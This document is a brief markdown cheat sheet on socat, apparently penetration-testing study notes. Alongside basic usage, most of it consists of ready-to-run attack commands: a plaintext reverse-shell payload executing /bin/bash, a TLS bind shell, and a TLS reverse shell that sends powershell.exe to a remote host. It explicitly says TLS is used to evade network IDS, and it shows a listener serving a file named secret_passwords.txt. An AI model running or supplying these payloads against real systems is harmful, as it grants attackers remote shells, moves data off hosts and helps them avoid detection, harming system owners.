---
title: Socat
tags:
- cheatsheet
- snippet
- linux
---

Socat establishes two bidirectional byte streams and transfers data between them

???+ note
    Socat uses *ip*:*port* notation

General usage
```bash
socat <SRC> <DST>
```

Example for stdin/stdout to webserver
```bash
socat - TCP4:192.168.1.80:80
```

File transfer
```bash
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
```

Shell listener
```bash
socat -d -d TCP4-LISTEN:443 STDOUT
```

Shell payload
```bash
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

## TLS Shell

Socat can use TLS to help evade network IDS.

Generate cert 
```bash
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```
Enter random data for the cert
```bash
cat bind_shell.crt bind_shell.key > bind_shell.pem
```

### Bind Shell

Payload
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Connect with
```bash
socat - OPENSSL:10.1.2.3:443,verify=0
```

### Reverse Shell

Listen with
```bash
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 -
```

Payload
```powershell
socat OPENSSL:192.168.119.154:443,verify=0 EXEC:'powershell.exe',pipes
```
